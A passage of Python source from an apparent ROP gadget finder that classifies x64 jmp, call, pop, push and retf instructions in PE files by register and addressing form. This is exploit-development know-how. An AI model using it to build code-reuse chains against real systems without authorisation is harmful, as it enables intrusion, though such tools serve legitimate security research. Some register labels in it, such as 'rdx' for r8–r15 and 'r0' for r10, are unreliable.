						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "rax", fg.jmpQwordOffsetRAX,offVal)
			elif "[rbx" in testVal:
				if "jmp qword ptr [rbx]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "rbx", fg.jmpQwordRBX)
				elif re.match( r'jmp qword ptr \[rbx [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "rbx", fg.jmpQwordOffsetRBX,offVal)
			elif "[rcx" in testVal:
				if "jmp qword ptr [rcx]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "rcx", fg.jmpQwordRCX)
				elif re.match( r'jmp qword ptr \[rcx [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "rcx", fg.jmpQwordOffsetRCX,offVal)
			elif "[rdx" in testVal:
				if "jmp qword ptr [rdx]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "rdx", fg.jmpQwordRDX)
				elif re.match( r'jmp qword ptr \[rdx [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "rdx", fg.jmpQwordOffsetRDX,offVal)
			elif "[r8" in testVal:
				if "jmp qword ptr [r8]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "r8", fg.jmpQwordR8)
				elif re.match( r'jmp qword ptr \[r8 [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "r8", fg.jmpQwordOffsetR8,offVal)
			elif "[r9" in testVal:
				if "jmp qword ptr [r9]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "r9", fg.jmpQwordR9)
				elif re.match( r'jmp qword ptr \[r9 [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "r9", fg.jmpQwordOffsetR9,offVal)
			elif "[r10" in testVal:
				if "jmp qword ptr [r10]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "r10", fg.jmpQwordR10)
				elif re.match( r'jmp qword ptr \[r10 [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "r10", fg.jmpQwordOffsetR10,offVal)
			elif "[r11" in testVal:
				if "jmp qword ptr [r11]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "r11", fg.jmpQwordR11)
				elif re.match( r'jmp qword ptr \[r11 [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "r11", fg.jmpQwordOffsetR11,offVal)
			elif "[r12" in testVal:
				if "jmp qword ptr [r12]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp","r12", fg.jmpQwordR12)
				elif re.match( r'jmp qword ptr \[r12 [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "r12", fg.jmpQwordOffsetR12,offVal)
			elif "[r13" in testVal:
				if "jmp qword ptr [r13]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "r13", fg.jmpQwordR13)
				elif re.match( r'jmp qword ptr \[r13 [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "r13", fg.jmpQwordOffsetR13,offVal)
			elif "[r14" in testVal:
				if "jmp qword ptr [r14]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "r14", fg.jmpQwordR14)
				elif re.match( r'jmp qword ptr \[r14 [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "r14", fg.jmpQwordOffsetR14,offVal)
			elif "[r15" in testVal:
				if "jmp qword ptr [r15]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "r15", fg.jmpQwordR15)
				elif re.match( r'jmp qword ptr \[r15 [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "r15", fg.jmpQwordOffsetR15,offVal)

	def go64_call(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2,call=False):
		if "qword" not in testVal:

			if re.match( r'\bcall rsi\b', testVal, re.M|re.I):
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "rsi", fg.callRSI)
			elif re.match( r'\bcall rbp\b', testVal, re.M|re.I):
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "rbp", fg.callRBP)
			elif re.match( r'\bcall rdi\b', testVal, re.M|re.I):
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "rdi", fg.callRDI)
			elif re.match( r'^call rax',testVal, re.M|re.I):
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "rax", fg.callRAX)
			elif re.match( r'^call rbx', testVal, re.M|re.I):
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "rbx", fg.callRBX)
			elif re.match( r'\bcall rsp\b',testVal, re.M|re.I):
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "rsp", fg.callRSP)	
			elif re.match( r'\bcall rcx\b', testVal, re.M|re.I):
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "rcx", fg.callRCX)
			elif re.match( r'\bcall rdx\b', testVal, re.M|re.I):
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "rdx", fg.callRDX)
			elif re.match( r'\bcall r8\b', testVal, re.M|re.I):
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "rdx", fg.callR8)
			elif re.match( r'\bcall r9\b', testVal, re.M|re.I):
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "rdx", fg.callR9)
			elif re.match( r'\bcall r10\b', testVal, re.M|re.I):
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "rdx", fg.callR10)
			elif re.match( r'\bcall r11\b', testVal, re.M|re.I):
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "rdx", fg.callR11)
			elif re.match( r'\bcall r12\b', testVal, re.M|re.I):
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "rdx", fg.callR12)
			elif re.match( r'\bcall r13\b', testVal, re.M|re.I):
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "rdx", fg.callR13)
			elif re.match( r'\bcall r14\b', testVal, re.M|re.I):
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "rdx", fg.callR14)
			elif re.match( r'\bcall r15\b', testVal, re.M|re.I):
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "rdx", fg.callR15)
		else:
			if "[rbp" in testVal:
				if "call qword ptr [rbp]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "rbp", fg.callQwordRBP)
				elif re.match( r'call qword ptr \[rbp [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "rbp", fg.callQwordOffsetRBP,offVal)
			elif "[rsp" in testVal:
				if "call qword ptr [rsp]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "rsp", fg.callQwordRSP)
				elif re.match( r'call qword ptr \[rsp [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "rsp", fg.callQwordOffsetRSP,offVal)
			elif "[rdi" in testVal:
				if "call qword ptr [rdi]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "rdi", fg.callQwordRDI)
				elif re.match( r'call qword ptr \[rdi [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "rdi", fg.callQwordOffsetRDI,offVal)
			elif "[rsi" in testVal:
				if "call qword ptr [rsi]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "rsi", fg.callQwordRSI)
				elif re.match( r'call qword ptr \[rsi [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "rsi", fg.callQwordOffsetRSI,offVal)
			elif "[rax" in testVal:
				if "call qword ptr [rax]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "rax", fg.callQwordRAX)
				elif re.match( r'call qword ptr \[rax [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "rax", fg.callQwordOffsetRAX,offVal)
			elif "[rbx" in testVal:
				if "call qword ptr [rbx]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "rbx", fg.callQwordRBX)
				elif re.match( r'call qword ptr \[rbx [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "rbx", fg.callQwordOffsetRBX,offVal)
			elif "[rcx" in testVal:
				if "call qword ptr [rcx]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "rcx", fg.callQwordRCX)
				elif re.match( r'call qword ptr \[rcx [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "rcx", fg.callQwordOffsetRCX,offVal)
			elif "[rdx" in testVal:
				if "call qword ptr [rdx]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "rdx", fg.callQwordRDX)
				elif re.match( r'call qword ptr \[rdx [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "rdx", fg.callQwordOffsetRDX,offVal)
			elif "[r8" in testVal:
				if "call qword ptr [r8]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "r8", fg.callQwordR8)
				elif re.match( r'call qword ptr \[r8 [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "r8", fg.callQwordOffsetR8,offVal)
			elif "[r9" in testVal:
				if "call qword ptr [r9]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "r9", fg.callQwordR9)
				elif re.match( r'call qword ptr \[r9 [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "r9", fg.callQwordOffsetR9,offVal)
			elif "[r10" in testVal:
				if "call qword ptr [r10]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "r0", fg.callQwordR10)
				elif re.match( r'call qword ptr \[r10 [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "r0", fg.callQwordOffsetR10,offVal)
			elif "[r11" in testVal:
				if "call qword ptr [r11]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "r11", fg.callQwordR11)
				elif re.match( r'call qword ptr \[r11 [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "r11", fg.callQwordOffsetR11,offVal)
			elif "[r12" in testVal:
				if "call qword ptr [r12]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call","r12", fg.callQwordR12)
				elif re.match( r'call qword ptr \[r12 [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "r12", fg.callQwordOffsetR12,offVal)
			elif "[r13" in testVal:
				if "call qword ptr [r13]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "r13", fg.callQwordR13)
				elif re.match( r'call qword ptr \[r13 [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "r13", fg.callQwordOffsetR13,offVal)
			elif "[r14" in testVal:
				if "call qword ptr [r14]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "r14", fg.callQwordR14)
				elif re.match( r'call qword ptr \[r14 [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "r14", fg.callQwordOffsetR14,offVal)
			elif "[r15" in testVal:
				if "call qword ptr [r15]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "r15", fg.callQwordR15)
				elif re.match( r'call qword ptr \[r15 [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "call", "r15", fg.callQwordOffsetR15,offVal)
			
	def do64Retf(self, name: str, testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		do = f"do64_hg_{name}"

		check1=raw.hex()+hex(saveq)
		if (check1) not in fg.junkBox64:
			if hasattr(self, do) and callable(func := getattr(self, do)):
				obj=func(testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2)
				dp("do func retf", name, hex(offL[lGoBack]))
				fg.junkBox64.add(check1)

	def do64RetfSingle(self, name: str, testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		dp("doRetfSingle")
		check1=raw.hex()+hex(saveq)
		do = f"do64_retf_s"

		if (check1) not in fg.junkBox64:
			if hasattr(self, do) and callable(func := getattr(self, do)):
				dp("do func retf single-pre", name, hex(offL[lGoBack]))

				obj=func(testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2)
				dp("do func retf single", name, hex(offL[lGoBack]))
				fg.junkBox64.add(check1)

	def do64_retf_s(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.retfSingle64)
	def do64_pop(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		if "ptr" not in testVal:
			if re.match( r'pop r[abcdspb]{2}', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.pops64)
			if re.match( r'\bpop rsi\b|\bpop esi\b', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rax", fg.popRSI)
			elif re.match( r'^pop [er]*b[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbx", fg.popRBX)
			elif re.match( r'^pop [er]*c[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rcx", fg.popRCX)
			elif re.match( r'^pop [er]*a[x|l|h]+',testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rax", fg.popRAX)
			elif re.match( r'\bpop rsi\b|\bpop esi\b', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdi", fg.popRDI)
			elif re.match( r'\bpop rbp\b|\bpop esi\b', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbp", fg.popRBP)
			elif re.match( r'\bpop rsp\b|\bpop esi\b',testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsp", fg.popRSP)
			elif re.match( r'^pop [er]*d[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.popRDX)
			elif re.match( r'^pop r8[dbw]*', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.popR8)
			elif re.match( r'^pop r9[dbw]*', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.popR9)
			elif re.match( r'^pop r10[dbw]*', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.popR10)
			elif re.match( r'^pop r11[dbw]*', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.popR11)
			elif re.match( r'^pop r12[dbw]*', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.popR12)
			elif re.match( r'^pop r13[dbw]*', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.popR13)
			elif re.match( r'^pop r14[dbw]*', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.popR14)
			elif re.match( r'^pop r15[dbw]*', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.popR15)
			else:
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.popOther64)
		else:
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.popQword)
			if re.match( r'^pop [qword|dword]+ ptr \[[er]*a[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rax", fg.popQwordRAX)
			elif re.match( r'^pop [qword|dword]+ ptr \[[er]*b[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbx", fg.popQwordRBX)
			elif re.match( r'^pop [qword|dword]+ ptr \[[er]*c[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rcx", fg.popQwordRCX)
			elif re.match( r'^pop [qword|dword]+ ptr \[[er]*d[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.popQwordRDX)
			elif re.match( r'^pop [qword|dword]+ ptr \[[er]*si', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsi", fg.popQwordRSI)
			elif re.match( r'^pop [qword|dword]+ ptr \[[er]*di', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdi", fg.popQwordRDI)
			elif re.match( r'^pop [qword|dword]+ ptr \[[er]*sp', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsp", fg.popQwordRSP)
			elif re.match( r'^pop [qword|dword]+ ptr \[[er]*bp', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbp", fg.popQwordRBP)
			elif re.match( r'^pop [qword|dword]+ ptr \[r8', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.popQwordR8)
			elif re.match( r'^pop [qword|dword]+ ptr \[r9', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.popQwordR9)
			elif re.match( r'^pop [qword|dword]+ ptr \[r10', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.popQwordR10)
			elif re.match( r'^pop [qword|dword]+ ptr \[r11', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.popQwordR11)
			elif re.match( r'^pop [qword|dword]+ ptr \[r12', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.popQwordR12)
			elif re.match( r'^pop [qword|dword]+ ptr \[r13', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.popQwordR13)
			elif re.match( r'^pop [qword|dword]+ ptr \[r14', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.popQwordR14)
			elif re.match( r'^pop [qword|dword]+ ptr \[r15', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.popQwordR15)
			else:
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbp", fg.popQwordOther)

	def do64_hg_push(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		if "ptr" not in testVal:
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.hgPush64)
			if re.match( r'^push [er]*a[x|l|h]+',testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rax", fg.hgPushRAX)
			elif re.match( r'^push [er]*b[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbx", fg.hgPushRBX)
			elif re.match( r'^push [er]*c[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rcx", fg.hgPushRCX)
			elif re.match( r'\bpush ebp\b', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbp", fg.hgPushRBP)
			elif re.match( r'\bpush esp\b',testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsp", fg.hgPushRSP)
			elif re.match( r'^push [er]*d[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.hgPushRDX)
			elif re.match( r'\bpush edi\b', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdi", fg.hgPushRDI)
			elif re.match( r'\bpush esi\b', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsi", fg.hgPushRSI)
			elif re.match( r'\bpush [-0x]*[0-9a-f]+\b', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsi", fg.hgPushConstant64)
			elif re.match( r'^push r8', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.hgPushR8)
			elif re.match( r'^push r9', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.hgPushR9)
			elif re.match( r'^push r10', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.hgPushR10)
			elif re.match( r'^push r11', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.hgPushR11)
			elif re.match( r'^push r12', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.hgPushR12)
			elif re.match( r'^push r13', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.hgPushR13)
			elif re.match( r'^push r14', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.hgPushR14)
			elif re.match( r'^push r15', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.hgPushR15)
			else:
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.hgPushOther64)
		else:
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.hgPushQword)
			if re.match( r'^push [qword|dword]+ ptr \[[er]*a[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rax", fg.hgPushQwordRAX)
			elif re.match( r'^push [qword|dword]+ ptr \[[er]*b[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbx", fg.hgPushQwordRBX)
			elif re.match( r'^push [qword|dword]+ ptr \[[er]*c[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rcx", fg.hgPushQwordRCX)
			elif re.match( r'^push [qword|dword]+ ptr \[[er]*d[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.hgPushQwordRDX)
			elif re.match( r'^push [qword|dword]+ ptr \[[er]*si', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsi", fg.hgPushQwordRSI)
			elif re.match( r'^push [qword|dword]+ ptr \[[er]*di', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdi", fg.hgPushQwordRDI)
			elif re.match( r'^push [qword|dword]+ ptr \[[er]*sp', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rsp", fg.hgPushQwordRSP)
			elif re.match( r'^push [qword|dword]+ ptr \[[er]*bp', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rbp", fg.hgPushQwordRBP)
			elif re.match( r'^push [qword|dword]+ ptr \[r8', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.hgPushQwordR8)
			elif re.match( r'^push [qword|dword]+ ptr \[r9', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.hgPushQwordR9)
			elif re.match( r'^push [qword|dword]+ ptr \[r10', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.hgPushQwordR10)
			elif re.match( r'^push [qword|dword]+ ptr \[r11', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.hgPushQwordR11)
			elif re.match( r'^push [qword|dword]+ ptr \[r12', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.hgPushQwordR12)
			elif re.match( r'^push [qword|dword]+ ptr \[r13', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.hgPushQwordR13)
			elif re.match( r'^push [qword|dword]+ ptr \[r14', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, "rdx", fg.hgPushQwordR14)
